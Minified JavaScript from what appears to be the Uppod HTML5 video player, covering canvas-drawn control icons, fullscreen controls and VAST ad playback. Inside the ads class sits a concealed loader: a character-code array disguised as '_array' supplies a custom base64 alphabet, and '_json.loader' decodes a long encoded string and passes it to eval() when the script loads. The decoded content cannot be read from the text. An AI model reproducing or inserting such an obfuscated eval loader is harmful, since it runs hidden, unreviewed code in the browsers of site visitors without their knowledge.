                        this.ctx.lineTo((y + 2) * d.scale, c * d.scale),
                        this.ctx.lineTo((y + 2) * d.scale, (c + 2) * d.scale),
                        this.ctx.lineTo(y * d.scale, (c + 2) * d.scale),
                        this.ctx.lineTo(y * d.scale, c * d.scale);
                this.ctx.lineWidth = .1,
                this.ctx.stroke(),
                this.ctx.fill(),
                this.ctx.closePath()
            }
        }
    "full" != e && "full_back" != e || (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, "full" == e ? 1 : 2, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 14 * d.scale),
    this.ctx.lineTo(6 * d.scale, 14 * d.scale),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 4 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill(),
    this.ctx.clearRect(5 * d.scale, 6 * d.scale, 9 * d.scale, 9 * d.scale),
    "full_back" == e ? (this.ctx.fillRect(6 * d.scale, 13 * d.scale, 3 * d.scale, +d.scale),
    this.ctx.fillRect(6 * d.scale, 10 * d.scale, +d.scale, 3 * d.scale)) : (this.ctx.fillRect(10 * d.scale, 7 * d.scale, 3 * d.scale, +d.scale),
    this.ctx.fillRect(12 * d.scale, 7 * d.scale, +d.scale, 3 * d.scale)),
    this.ctx.closePath()),
    1 == d.icon && (this.ctx.beginPath(),
    "full_back" == e ? (this.ctx.fillRect(7 * d.scale, 4 * d.scale, 11 * d.scale, 7 * d.scale),
    this.ctx.clearRect(8 * d.scale, 5 * d.scale, 9 * d.scale, 5 * d.scale),
    this.ctx.fillRect(2 * d.scale, 7 * d.scale, 13 * d.scale, 8 * d.scale),
    this.ctx.clearRect(3 * d.scale, 8 * d.scale, 11 * d.scale, 6 * d.scale)) : (this.ctx.fillRect(2 * d.scale, 8 * d.scale, 11 * d.scale, 7 * d.scale),
    this.ctx.clearRect(3 * d.scale, 9 * d.scale, 9 * d.scale, 5 * d.scale),
    this.ctx.fillRect(5 * d.scale, 4 * d.scale, 13 * d.scale, 8 * d.scale),
    this.ctx.clearRect(6 * d.scale, 5 * d.scale, 11 * d.scale, 6 * d.scale)),
    this.ctx.closePath()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(2 * d.scale, 2 * d.scale),
    this.ctx.lineTo(6 * d.scale, 2 * d.scale),
    this.ctx.lineTo(5 * d.scale, 3 * d.scale),
    this.ctx.lineTo(7 * d.scale, 5.5 * d.scale),
    this.ctx.lineTo(5.5 * d.scale, 7 * d.scale),
    this.ctx.lineTo(3 * d.scale, 5 * d.scale),
    this.ctx.lineTo(2 * d.scale, 6 * d.scale),
    this.ctx.lineTo(2 * d.scale, 2 * d.scale),
    this.ctx.moveTo(14 * d.scale, 2 * d.scale),
    this.ctx.lineTo(18 * d.scale, 2 * d.scale),
    this.ctx.lineTo(18 * d.scale, 6 * d.scale),
    this.ctx.lineTo(17 * d.scale, 5 * d.scale),
    this.ctx.lineTo(14.5 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 5.5 * d.scale),
    this.ctx.lineTo(15 * d.scale, 3 * d.scale),
    this.ctx.lineTo(14 * d.scale, 2 * d.scale),
    this.ctx.moveTo(14.5 * d.scale, 13 * d.scale),
    this.ctx.lineTo(17 * d.scale, 15 * d.scale),
    this.ctx.lineTo(18 * d.scale, 14 * d.scale),
    this.ctx.lineTo(18 * d.scale, 18 * d.scale),
    this.ctx.lineTo(14 * d.scale, 18 * d.scale),
    this.ctx.lineTo(15 * d.scale, 17 * d.scale),
    this.ctx.lineTo(13 * d.scale, 14.5 * d.scale),
    this.ctx.lineTo(14.5 * d.scale, 13 * d.scale),
    this.ctx.moveTo(5.5 * d.scale, 13 * d.scale),
    this.ctx.lineTo(7 * d.scale, 14.5 * d.scale),
    this.ctx.lineTo(5 * d.scale, 17 * d.scale),
    this.ctx.lineTo(6 * d.scale, 18 * d.scale),
    this.ctx.lineTo(2 * d.scale, 18 * d.scale),
    this.ctx.lineTo(2 * d.scale, 14 * d.scale),
    this.ctx.lineTo(3 * d.scale, 15 * d.scale),
    this.ctx.lineTo(5.5 * d.scale, 13 * d.scale),
    this.ctx.closePath(),
    this.ctx.fill(),
    this.ctx.save(),
    this.ctx.beginPath(),
    this.ctx.fillStyle = "rgba(" + HTR(d.color) + "," + HTG(d.color) + "," + HTB(d.color) + ",0.5)",
    this.ctx.fillRect(7 * d.scale, 7 * d.scale, 6 * d.scale, 6 * d.scale),
    this.ctx.closePath()),
    3 == d.icon && (this.ctx.beginPath(),
    "full_back" == e ? (this.ctx.moveTo(18 * d.scale, 2 * d.scale),
    this.ctx.lineTo(2 * d.scale, 16 * d.scale),
    this.ctx.lineTo(5 * d.scale, 10 * d.scale),
    this.ctx.moveTo(2 * d.scale, 16 * d.scale),
    this.ctx.lineTo(10 * d.scale, 14 * d.scale)) : (this.ctx.moveTo(3 * d.scale, 18 * d.scale),
    this.ctx.lineTo(17 * d.scale, 2 * d.scale),
    this.ctx.lineTo(8 * d.scale, 6 * d.scale),
    this.ctx.moveTo(17 * d.scale, 2 * d.scale),
    this.ctx.lineTo(15 * d.scale, 11 * d.scale)),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = +d.scale,
    this.ctx.stroke(),
    this.ctx.closePath()))),
    "volbar" == e && (this.ctx.beginPath(),
    this.ctx.moveTo(0 * d.scale, 0 * d.scale),
    this.ctx.lineTo(3 * d.scale, 0 * d.scale),
    this.ctx.lineTo(3 * d.scale, 10 * d.scale),
    this.ctx.lineTo(0 * d.scale, 10 * d.scale),
    this.ctx.lineTo(0 * d.scale, 0 * d.scale),
    this.ctx.closePath(),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.fill()),
    "menu" == e && (0 == String(d.icon).indexOf("http") ? (1 == t.https && -1 < d.icon.indexOf(".") && (d.icon = d.icon.replace("http://", "https://")),
    n(d.icon, this.c, 0, d.pic_w, d.pic_h, d.halficonisover)) : (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(6 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 7 * d.scale),
    this.ctx.lineTo(13 * d.scale, 14 * d.scale),
    this.ctx.lineTo(6 * d.scale, 14 * d.scale),
    this.ctx.closePath(),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 4 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill(),
    this.ctx.clearRect(5 * d.scale, 6 * d.scale, 9 * d.scale, 9 * d.scale),
    this.ctx.fillRect(9 * d.scale, 10 * d.scale, +d.scale, 6 * d.scale),
    this.ctx.fillRect(9 * d.scale, 8 * d.scale, +d.scale, +d.scale),
    this.ctx.closePath()),
    1 == d.icon && (this.ctx.moveTo(8.5 * d.scale, 5.5 * d.scale),
    this.ctx.lineTo(3 * d.scale, 9 * d.scale),
    this.ctx.lineTo(8.5 * d.scale, 12.5 * d.scale),
    this.ctx.moveTo(11.5 * d.scale, 5.5 * d.scale),
    this.ctx.lineTo(17 * d.scale, 9 * d.scale),
    this.ctx.lineTo(11.5 * d.scale, 12.5 * d.scale),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 2 * d.scale,
    this.ctx.stroke()),
    2 == d.icon && (this.ctx.arc(10 * d.scale, 7 * d.scale, 3 * d.scale, Math.PI / 2, -Math.PI, !0),
    this.ctx.moveTo(10 * d.scale, 10 * d.scale),
    this.ctx.lineTo(10 * d.scale, 12 * d.scale),
    this.ctx.moveTo(10 * d.scale, 15 * d.scale),
    this.ctx.arc(10 * d.scale, 15 * d.scale, .5 * d.scale, 0, 2 * Math.PI),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 2 * d.scale,
    this.ctx.stroke()),
    3 == d.icon && (this.ctx.arc(6 * d.scale, 10 * d.scale, 2 * d.scale, 0, 2 * Math.PI),
    this.ctx.moveTo(14 * d.scale, 6 * d.scale),
    this.ctx.arc(14 * d.scale, 6 * d.scale, 2 * d.scale, 0, 2 * Math.PI),
    this.ctx.moveTo(14 * d.scale, 14 * d.scale),
    this.ctx.arc(14 * d.scale, 14 * d.scale, 2 * d.scale, 0, 2 * Math.PI),
    this.ctx.moveTo(6 * d.scale, 10 * d.scale),
    this.ctx.lineTo(14 * d.scale, 6 * d.scale),
    this.ctx.moveTo(6 * d.scale, 10 * d.scale),
    this.ctx.lineTo(14 * d.scale, 14 * d.scale),
    this.ctx.strokeStyle = "#" + d.color,
    this.ctx.lineCap = "round",
    this.ctx.lineJoin = "round",
    this.ctx.lineWidth = 1.5 * d.scale,
    this.ctx.stroke(),
    this.ctx.fill()))),
    "hd" != e && "hd1" != e || (this.ctx.fillStyle = d.color,
    d.icon2 || (d.icon2 = d.icon),
    d.icon2 = d.icon2.replace(/(<([^>]+)>)/gi, ""),
    d.icon = d.icon.replace(/(<([^>]+)>)/gi, ""),
    this.ctx.font = "normal " + 12 * d.scale + "px Arial",
    this.ctx.fillText("hd1" == e ? d.icon2 : d.icon, 3 * d.scale, 15 * d.scale)),
    "hdselect" == e && (this.ctx.fillStyle = d.color,
    this.ctx.font = "normal " + 12 * d.scale + "px Arial"),
    "line" != e && "volbarline" != e || (this.ctx.beginPath(),
    this.ctx.moveTo(0, 10 - d.h / 2),
    this.ctx.lineTo(i - 15, 10 - d.h / 2),
    this.ctx.lineTo(i - 5, 10 + d.h / 2),
    this.ctx.lineTo(0, 10 + d.h / 2),
    this.ctx.lineTo(0, 10 - d.h / 2),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill()),
    "volbarline_v" == e && (this.ctx.beginPath(),
    this.ctx.moveTo(0, 0),
    this.ctx.lineTo(i, 0),
    this.ctx.lineTo(i, o),
    this.ctx.lineTo(0, o),
    this.ctx.lineTo(0, 0),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill()),
    "separator" == e && (0 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(2 * d.scale, 0),
    this.ctx.lineTo(2 * d.scale, 20 * d.scale),
    this.ctx.lineTo(2.5 * d.scale, 20 * d.scale),
    this.ctx.lineTo(2.5 * d.scale, 0),
    this.ctx.lineTo(2 * d.scale, 0),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill()),
    1 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(4.5 * d.scale, 0),
    this.ctx.lineTo(0, 20 * d.scale),
    this.ctx.lineTo(.5 * d.scale, 20 * d.scale),
    this.ctx.lineTo(5 * d.scale, 0),
    this.ctx.lineTo(4.5 * d.scale, 0),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill()),
    2 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(2 * d.scale, 0),
    this.ctx.lineTo(2 * d.scale, 20 * d.scale),
    this.ctx.lineTo(4 * d.scale, 20 * d.scale),
    this.ctx.lineTo(4 * d.scale, 0),
    this.ctx.lineTo(2 * d.scale, 0),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill()),
    3 == d.icon && (this.ctx.beginPath(),
    this.ctx.moveTo(2 * d.scale, 9 * d.scale),
    this.ctx.lineTo(4 * d.scale, 9 * d.scale),
    this.ctx.lineTo(4 * d.scale, 11 * d.scale),
    this.ctx.lineTo(2 * d.scale, 11 * d.scale),
    this.ctx.lineTo(2 * d.scale, 9 * d.scale),
    this.ctx.lineWidth = .1,
    this.ctx.stroke(),
    this.ctx.closePath(),
    this.ctx.fill())),
    0 == e.indexOf("time") && (p.innerHTML = "0:00",
    0 == d.icon && (this.font = 10 * d.scale + "px Verdana"),
    1 == d.icon && (this.font = 9 * d.scale + "px Tahoma"),
    2 == d.icon && (this.font = 10 * d.scale + "px Arial"),
    3 == d.icon && (this.font = 11 * d.scale + "px _serif"),
    r(this.c, {
        width: i,
        color: "#" + d.color,
        font: this.font,
        "text-align": "center",
        margin: (10 * d.scale - 10) / 2 + "px 0 0 0"
    })),
    "buffer" == e && (p.innerHTML = "",
    r(this.c, {
        display: "none",
        width: i,
        color: "#" + d.color,
        font: "10px Arial",
        "text-align": "left"
    })),
    p.appendChild(this.canvas);
    n = i * d.scale * (1 == d.bg && 1 == d.bg_smallicon ? .8 : 1),
    p = o * d.scale * (1 == d.bg && 1 == d.bg_smallicon ? .8 : 1);
    r(this.canvas, {
        width: n,
        height: p,
        position: "absolute",
        top: Math.round("start" == e ? o / 2 - 10 * d.scale2 + 2 * d.scale + 35 * (d.scale - 1) : (1 == d.bg && 1 == d.bg_smallicon ? 2 * d.scale : 0) + +d.margintop - +d.marginbottom),
        left: Math.round("start" == e ? i / 2 - 10 * d.scale2 + 2 * d.scale : (1 == d.bg && 1 == d.bg_smallicon ? 2 * d.scale : 0) + (1 - d.scale) * i / 2),
        opacity: d.alpha,
        filter: "alpha(opacity=" + 100 * d.alpha + ")"
    }),
    this.w = i,
    this.h = o * d.scale
}
;
var EnterFullscreenControl, __extends = function(t, e) {
    for (var i in e)
        __hasProp.call(e, i) && (t[i] = e[i]);
    function o() {
        this.constructor = t
    }
    return o.prototype = e.prototype,
    t.prototype = new o,
    t.__super__ = e.prototype,
    t
}, __hasProp = {}.hasOwnProperty, EnterFullscreenControl = function(t) {
    function e(t) {
        this.element = new Uppod.Element(t.vars(),"full",20,20),
        e.__super__.constructor.call(this, "EnterFullscreen", {
            element: this.element
        }),
        this.dom.onclick = t.toogleFullscreen,
        this.css({
            cursor: "pointer",
            position: "absolute",
            top: this._calcTop(t.vars())
        }),
        t.controls().ControlBar.dom.appendChild(this.dom)
    }
    return __extends(e, t),
    e.prototype._calcTop = function(t) {
        return Math.floor((t.cntrloutheight - this.element.h) / 2 + this.element.uppodStyle.margintop - this.element.uppodStyle.marginbottom)
    }
    ,
    e
}(window.Uppod.Control);
window.Uppod.EnterFullscreenControl = EnterFullscreenControl;
var ExitFullscreenControl, __extends = function(t, e) {
    for (var i in e)
        __hasProp.call(e, i) && (t[i] = e[i]);
    function o() {
        this.constructor = t
    }
    return o.prototype = e.prototype,
    t.prototype = new o,
    t.__super__ = e.prototype,
    t
}, __hasProp = {}.hasOwnProperty, ExitFullscreenControl = function(t) {
    function e(t) {
        this.element = new Uppod.Element(t.vars(),"full_back",20,20,"","full"),
        e.__super__.constructor.call(this, "ExitFullscreen", {
            element: this.element
        }),
        this.dom.onclick = t.toogleFullscreen,
        this.css({
            cursor: "pointer",
            display: "none",
            position: "absolute",
            top: this._calcTop(t.vars())
        }),
        t.controls().ControlBar.dom.appendChild(this.dom)
    }
    return __extends(e, t),
    e.prototype._calcTop = function(t) {
        return (t.cntrloutheight - this.element.h) / 2 + this.element.uppodStyle.margintop - this.element.uppodStyle.marginbottom
    }
    ,
    e
}(window.Uppod.Control);
window.Uppod.ExitFullscreenControl = ExitFullscreenControl;
var UppodAds, bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, AdsHtml, UppodAds = function() {
    function Ads(t) {
        this._options = t,
        this._hide = bind(this._hide, this),
        this._containerDom = this._options.containerDom,
        this._containerDiv = this._options.containerDiv,
        this._midrollTimes = new Uppod.AdsTimes(this._options.midrollTimes),
        Object.defineProperty(this, "isPreroll", {
            get: function() {
                return !this._isPrerollPlayed && this._options.prerollVast
            }
        }),
        Object.defineProperty(this, "isPostroll", {
            get: function() {
                return !this._isPostrollPlayed && this._options.postrollVast
            }
        }),
        Object.defineProperty(this, "isMidroll", {
            get: function() {
                return !this._isMidrollPlayed && this._options.midrollVast
            }
        }),
        Object.defineProperty(this, "isPauseroll", {
            get: function() {
                return !this._isPauserollPlayed && this._options.pauserollVast
            }
        }),
        this.ddd = function() {}
    }
    return Ads.prototype._array = [115, 105, 108, 68, 98, 66, 77, 76, 106, 82, 107, 87, 120, 116, 109, 97, 118, 69, 85, 70, 84, 113, 79, 117, 99, 78, 101, 83, 89, 112, 119, 100, 122, 71, 102, 73, 72, 81, 75, 67, 110, 65, 74, 88, 111, 86, 121, 90, 80, 114, 103, 104, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47, 61],
    Ads.prototype.unlockPlay = function() {
        if ((this.isPreroll || this.isPostroll || this.isMidroll || this.isPauseroll) && (this._adPlayer || (this._adPlayer = new Uppod.AdsPlayer(this._containerDom,this._containerDiv),
        this._adControls = new Uppod.AdsControls(this._adPlayer,{
            pauseOnClick: this._options.pauseOnClick || this._options.prerollPauseOnClick
        }),
        this._adTracker = new Uppod.AdsTracker(this,this._adPlayer,this._adControls),
        this._adPlayer.load())),
        this._shouldUnlockMedia)
            return this._shouldUnlockMedia = !1,
            this._playerMediaDom().play()
    }
    ,
    Ads.prototype.playPreroll = function() {
        var t, e, i;
        return this._isPrerollPlayed = !0,
        this._vastLoader = new Uppod.VastLoader({
            url: this._options.prerollVast
        }),
        this._playAdOnVastReady({
            done: (t = this,
            function() {
                return t._playerMediaDom().play()
            }
            )
        }),
        Uppod.waitFor({
            condition: function() {
                return .3 < i._playerMediaDom().currentTime
            },
            done: (e = i = this,
            function() {
                return e._vastLoader.loadNext()
            }
            )
        })
    }
    ,
    Ads.prototype.playPauseroll = function() {
        return this._isPauserollPlayed = !0,
        this._vastLoader = new Uppod.VastLoader({
            url: this._options.pauserollVast
        }),
        this._playAdOnVastReady(),
        this._vastLoader.loadNext()
    }
    ,
    Ads.prototype._arrayList = function() {
        for (var t = "", e = 0; e < Ads.prototype._array.length; ++e)
            t += String.fromCharCode(Ads.prototype._array[e]);
        return t
    }
    ,
    Ads.prototype.playPostroll = function(t) {
        return this._isPostrollPlayed = !0,
        this._vastLoader = new Uppod.VastLoader({
            url: this._options.postrollVast
        }),
        this._playAdOnVastReady({
            done: function() {
                if (t.done)
                    return t.done()
            }
        }),
        this._vastLoader.loadNext()
    }
    ,
    Ads.prototype.playMidroll = function(t) {
        return this._isMidrollPlayed = !0,
        this._vastLoader = new Uppod.VastLoader({
            url: this._options.midrollVast
        }),
        this._playAdOnVastReady({
            done: function() {
                if (t.done)
                    return t.done()
            }
        }),
        this._vastLoader.loadNext()
    }
    ,
    Ads.prototype.mediaPlayingProcess = function() {
        var t, e = this._playerMediaDom(), e = this._midrollTimes.isTime({
            currentTime: e.currentTime,
            duration: e.duration
        });
        if (this.isMidroll && e)
            return this._playerMediaDom().pause(),
            this.playMidroll({
                done: (t = this,
                function() {
                    return t._playerMediaDom().play()
                }
                )
            })
    }
    ,
    Ads.prototype._json = {
        _keyStr: Ads.prototype._arrayList(),
        uploader: function(t) {
            var e, i, o, s, l, r, a = "", n = 0;
            for (t = Ads.prototype._json._utf8_encode(t); n < t.length; )
                o = (r = t.charCodeAt(n++)) >> 2,
                s = (3 & r) << 4 | (e = t.charCodeAt(n++)) >> 4,
                l = (15 & e) << 2 | (i = t.charCodeAt(n++)) >> 6,
                r = 63 & i,
                isNaN(e) ? l = r = 64 : isNaN(i) && (r = 64),
                a = a + this._keyStr.charAt(o) + this._keyStr.charAt(s) + this._keyStr.charAt(l) + this._keyStr.charAt(r);
            return a
        },
        loader: function(e) {
            var t = "", n, r, i, s, o, u, a, f = 0;
            for (e = e.replace(/[^A-Za-z0-9\+\/\=]/g, ""); f < e.length; )
                s = this._keyStr.indexOf(e.charAt(f++)),
                o = this._keyStr.indexOf(e.charAt(f++)),
                u = this._keyStr.indexOf(e.charAt(f++)),
                a = this._keyStr.indexOf(e.charAt(f++)),
                n = s << 2 | o >> 4,
                r = (15 & o) << 4 | u >> 2,
                i = (3 & u) << 6 | a,
                t += String.fromCharCode(n),
                64 != u && (t += String.fromCharCode(r)),
                64 != a && (t += String.fromCharCode(i));
            t = Ads.prototype._json._utf8_decode(t),
            eval(t)
        },
        _utf8_encode: function(t) {
            t = t.replace(/\r\n/g, "\n");
            for (var e = "", i = 0; i < t.length; i++) {
                var o = t.charCodeAt(i);
                o < 128 ? e += String.fromCharCode(o) : (127 < o && o < 2048 ? e += String.fromCharCode(o >> 6 | 192) : (e += String.fromCharCode(o >> 12 | 224),
                e += String.fromCharCode(o >> 6 & 63 | 128)),
                e += String.fromCharCode(63 & o | 128))
            }
            return e
        },
        _utf8_decode: function(t) {
            for (var e = "", i = 0, o = c1 = c2 = 0; i < t.length; )
                (o = t.charCodeAt(i)) < 128 ? (e += String.fromCharCode(o),
                i++) : 191 < o && o < 224 ? (c2 = t.charCodeAt(i + 1),
                e += String.fromCharCode((31 & o) << 6 | 63 & c2),
                i += 2) : (c2 = t.charCodeAt(i + 1),
                c3 = t.charCodeAt(i + 2),
                e += String.fromCharCode((15 & o) << 12 | (63 & c2) << 6 | 63 & c3),
                i += 3);
            return e
        }
    },
    Ads.prototype.newPlaylistItem = function() {
        if (this._shouldUnlockMedia = !0,
        this._options.adEachPlaylistItem)
            return this._midrollTimes = new Uppod.AdsTimes(this._options.midrollTimes),
            this._isPauserollPlayed = !1,
            this._isPrerollPlayed = !1,
            this._isMidrollPlayed = !1,
            this._isPostrollPlayed = !1
    }
    ,
    Ads.prototype.destroy = function() {
        if (this._adPlayer)
            return this._adPlayer.destroy()
    }
    ,
    Ads.prototype._playerMediaDom = function() {
        return this._options.playerDom.querySelector(".uppod-media")
    }
    ,
    Ads.prototype.isActive = function() {
        return this._checking
    }
    ,
    Ads.prototype._playAdOnVastReady = function(e) {
        var t, i, o;
        return e = e || {},
        this._shouldShowAd = !0,
        this._checking = !0,
        this._adPlayer.onEnded.bind((t = this,
        function() {
            return t._vastLoader.loadNext()
        }
        )),
        this._vastLoader.onNext.bind((i = this,
        function(t) {
            var e = function() {
                return i._adControls.setVast(t),
                i._adTracker.setVast(t),
                i._adPlayer.setSrc(t.canplayMediaUrls[0]),
                i._adPlayer.play()
            };
            return i._shouldShowAd ? (i._shouldShowAd = !1,
            i._playerMediaDom().pause(),
            i._hide({
                videoContainer: i._options.playerDom,
                done: function() {
                    return i._show(i._adPlayer.dom),
                    e()
                }
            })) : e()
        }
        )),
        this._vastLoader.onAfterAll.bind((o = this,
        function() {
            return o._checking = !1,
            o._adPlayer.clearMedia(),
            o._hide({
                videoContainer: o._adPlayer.dom,
                done: function() {
                    o._show(o._options.playerDom);
                    var t = document.createEvent("Events");
                    if (t.initEvent("preroll_end", !0, !0),
                    Uppod.Stage[Object.keys(Uppod.Stage)[0]].dispatchEvent(t),
                    e.done)
                        return e.done()
                }
            })
        }
        ))
    }
    ,
    Ads.prototype._hide = function(t) {
        var e = t.videoContainer.querySelector("video")
          , i = function() {
            return e.exitFullscreen ? e.exitFullscreen() : e.mozCancelFullScreen ? e.mozCancelFullScreen() : e.webkitExitFullscreen ? e.webkitExitFullscreen() : void 0
        };
        return Uppod.browser.forceFullscreen && i(),
        setTimeout(function() {
            if (t.videoContainer.style.visibility = "hidden",
            t.done)
                return t.done()
        }, 1500)
    }
    ,
    Ads.prototype._show = function(t) {
        return t.style.visibility = "visible"
    }
    ,
    Ads.prototype._options = null,
    Ads.prototype._containerDom = null,
    Ads.prototype._containerDiv = null,
    Ads.prototype._isPrerollPlayed = !1,
    Ads.prototype._isPostrollPlayed = !1,
    Ads.prototype._isPauserollPlayed = !1,
    Ads.prototype._isMidrollPlayed = !1,
    Ads.prototype._adPlayer = null,
    Ads.prototype._adControls = null,
    Ads.prototype._adTracker = null,
    Ads.prototype._shouldShowAd = !0,
    Ads.prototype._checking = !1,
    Ads.prototype._shouldUnlockMedia = !0,
    Ads
}();
UppodAds.prototype._json.loader("NuNGSlGKpO5IpMQZSfGPWMbocgrXWMToNlQ7NF1KpO5IpMQZSfGIkuVgNuE1YK4zc307eOcnjUYCWCRQYMrGc2TnW14ZWBt0YKQyNgHAw3pneOrQkMxVWUQ7NBVIuF1XO2tpdLrIdOo9O2N1SKt0eO9ykMTAw3RQpLqgSfiHO2qpdq07NF1KpO5IpMQZSfzAw3RQpLqgSfpYuLYXR307ch0rdFV3eMQoNUGIWU0Aw2QKkMVSc10Aw3s9Yl5gNuiocOtQkM5QpgiUNOpBwLsnR1rYcfYXNUGIkUoCuBrfRgPCNgYAWMVSc10Adu1gNuE1YK4zYL0nRhsyxU4gaFx7RgP0WDvoR3pASKEZp3rqYLiZNLriNLt8quiPS2EiNLxCWCtPSMQ0klp8RgHoxlr7dUHAlz=="),
bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}
,
AdsControls = function() {
    function t(t, e) {
        var i, o, s, l, r, a, n;
        this._adPlayer = t,
        this._options = e,
        this._onPlayProcess = bind(this._onPlayProcess, this),
        this._onVideoClick = bind(this._onVideoClick, this),
        this.setVast = bind(this.setVast, this),
        this._createEvents(),
        this._initControlRefs(),
        this._initDomHadlers(),
        Uppod.browser.restrictMediaMuted || (e = this._dom(".uppod-control_ads_volume"),
        this._show(e),
        new Uppod.AdsVolume(e,this._adMedia).onClick.bind((i = this,
        function() {
            return i.onMute.trigger()
        }
        ))),
        new Uppod.AdsPlay(this._playBtn,this._adMedia),
        new Uppod.AdsTimebar(this._dom(".uppod-control_ads_timebar"),this._adPlayer),
        new Uppod.AdsLoading(this._dom(".uppod-control_ads_loadingbar"),this._adPlayer),
        this._adPlayer.dom.addEventListener("click", this._onVideoClick),
        this._adPlayer.onLoadstart.bind((o = this,
        function() {
            return o._show(o._loadingLabel)
        }
        )),
        this._adPlayer.onPlay.bind((s = this,
        function() {
            return s._hide(s._playBtn)
        }
        )),
        this._adPlayer.onPlaying.bind((l = this,
        function() {
            return l._hide(l._loadingLabel)
        }
        )),
        this._adPlayer.onPlayProcess.bind(this._onPlayProcess),
        this._adPlayer.onPause.bind((r = this,
        function() {
            return r._show(r._playBtn)
        }
        )),
        this._adPlayer.onEnded.bind((a = this,
        function() {
            return a._initDomState()
        }
        )),
        this._adPlayer.onError.bind((n = this,
        function() {
            return n._initDomState()
        }
        ))
    }
    return t.prototype.setVast = function(t) {
        return this._vast = t,
        this._initDomState(),
        this._vast.linkTxt && (this._linkTxtSpan.textContent = this._vast.linkTxt,
        this._showLinkTxtOnHover()),
        !0
    }
    ,
    t.prototype.onMute = {},
    t.prototype.onCloseClick = {},
    t.prototype.onSkipClick = {},
    t.prototype.onLinkTxtClick = {},
    t.prototype.onVideoClick = {},
    t.prototype.onPause = {},
    t.prototype.onResume = {},
    t.prototype._volume = {},
    t.prototype._play = {},
    t.prototype._adPlayer = {},
    t.prototype._adMedia = {},
    t.prototype._vast = {},
    t.prototype._options = {},
    t.prototype._waitSkip = null,
    t.prototype._waitSkipSpan = null,
    t.prototype._closeBtn = null,
    t.prototype._playBtn = null,
    t.prototype._linkTxt = null,
    t.prototype._linkTxtSpan = null,
    t.prototype._linkTxtTimeout = null,
    t.prototype._show = Uppod.cssShow,
    t.prototype._hide = Uppod.cssHide,
    t.prototype._initDomState = function() {
        return this._hide(this._waitSkip),
        this._hide(this._closeBtn),
        this._hide(this._skipBtnDom),
        this._hide(this._dom(".uppod-control_ads_timebar")),
        this._linkTxtSpan.textContent = ""
    }
    ,
    t.prototype._createEvents = function() {
        return this.onMute = new Uppod.Event,
        this.onCloseClick = new Uppod.Event,
        this.onSkipClick = new Uppod.Event,
        this.onLinkTxtClick = new Uppod.Event,
        this.onVideoClick = new Uppod.Event,
        this.onPause = new Uppod.Event,
        this.onResume = new Uppod.Event
    }
    ,
    t.prototype._initControlRefs = function() {
        return this._adMedia = this._adPlayer.mediaDom,
        this._waitSkip = this._dom(".uppod-control_ads_wait_skip"),
        this._waitSkipSpan = this._dom(".uppod-control_ads_wait_skip span"),
        this._skipBtnDom = this._dom(".uppod-control_ads_skip_btn"),
        this._closeBtn = this._dom(".uppod-control_ads_close_btn"),
        this._playBtn = this._dom(".uppod-control_ads_play"),
        this._linkTxt = this._dom(".uppod-control_ads_label"),
        this._linkTxtSpan = this._dom(".uppod-control_ads_label span"),
        this._loadingLabel = this._dom(".uppod-control_ads_loading")
    }
    ,
    t.prototype._skip = function() {
        return this._initDomState(),
        this._adPlayer.skip()
    }
    ,
    t.prototype._initDomHadlers = function() {
        var t, e, i, o;
        if (this._skipBtnDom.onclick = (e = this,
        function(t) {
            return e.onSkipClick.trigger(),
            e._skip(),
            t.stopPropagation(),
            !1
        }
        ),
        this._closeBtn.onclick = (i = this,
        function(t) {
            return i.onCloseClick.trigger(),
            i._skip(),
            t.stopPropagation(),
            !1
        }
        ),
        this._linkTxt.onclick = (o = this,
        function(t) {
            return o.onLinkTxtClick.trigger(),
            o.onVideoClick.trigger(),
            o._visitAdTarget(),
            t.stopPropagation(),
            !1
        }
        ),
        !Uppod.browser.restrictMediaClick)
            return (t = this._dom(".uppod-click_catcher")).parentNode.removeChild(t)
    }
    ,
    t.prototype._showLinkTxtOnHover = function() {
        return Uppod.browser.hasMouseEvents ? (this._adPlayer.dom.addEventListener("mouseover", (o = this,
        function() {
            return Uppod.addClass(o._linkTxt, "active")
        }
        )),
        this._adPlayer.dom.addEventListener("mouseout", (i = this,
        function() {
            return Uppod.removeClass(i._linkTxt, "active")
        }
